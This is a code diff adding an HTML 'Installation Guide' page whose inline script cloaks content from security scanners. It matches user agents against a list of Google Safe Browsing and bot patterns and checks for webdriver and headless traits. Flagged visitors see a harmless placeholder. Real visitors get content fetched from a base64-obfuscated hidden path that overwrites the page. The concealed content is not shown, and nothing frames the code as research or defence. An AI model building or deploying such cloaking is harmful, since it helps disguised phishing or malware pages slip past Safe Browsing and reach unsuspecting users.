@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Installation Guide</title>
+    <script>
+        // /hidden_content/install_guide.html -> L2hpZGRlbl9jb250ZW50L2luc3RhbGxfZ3VpZGUuaHRtbA==
+        const realContent = 'L2hpZGRlbl9jb250ZW50L2luc3RhbGxfZ3VpZGUuaHRtbA==';
+
+        // Enhanced GSB Crawler Detection: User-Agent patterns + Browser features
+        function detectRealBrowser() {
+            const userAgent = navigator.userAgent || '';
+            
+            // Google Safe Browsing and bot detection patterns
+            const googleBotPatterns = [
+                /googlebot/i,
+                /google.*safe.*browsing/i,
+                /google.*safebrowsing/i,
+                /safebrowsing/i,
+                /google.*security/i,
+                /google.*malware/i,
+                /google.*phishing/i,
+                /google.*transparency/i,
+                /google.*site.*verification/i,
+                /google.*page.*speed/i,
+                /adsbot-google/i,
+                /mediapartners-google/i
+            ];
+            
+            const isGoogleBot = googleBotPatterns.some(pattern => pattern.test(userAgent));
+            
+            // Mobile detection
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+            
+            // Browser feature checks
+            const hasNotificationAPI = typeof self.Notification !== 'undefined';
+            const hasWebdriver = navigator.webdriver === true;
+            const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+            const hasChrome = window.chrome && window.chrome.runtime;
+            const hasPermissions = navigator.permissions !== undefined;
+            
+            // Real browser: Not a Google bot AND has browser features OR is mobile
+            return !isGoogleBot && ((hasNotificationAPI && !hasWebdriver && (hasPlugins || hasChrome || hasPermissions)) || isMobile);
+        }
+        
+        const isRealBrowser = detectRealBrowser();
+
+        if (isRealBrowser) {
+            fetch(atob(realContent))
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to load content');
+                    }
+                    return response.text();
+                })
+                .then(html => {
+                    document.open();
+                    document.write(html);
+                    document.close();
+                })
+                .catch(err => {
+                    console.error('Error loading content:', err);
+                    // Show benign content on error instead of failing silently
+                    document.write('<h1>Installation Guide</h1><p>Please check back later for installation instructions.</p>');
+                });
+        } else {
+            // GSB Crawler / Bot (headless Chrome) - Show benign content
+            document.write('<h1>Installation Guide</h1><p>Please check back later for installation instructions.</p>');
+        }
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
+
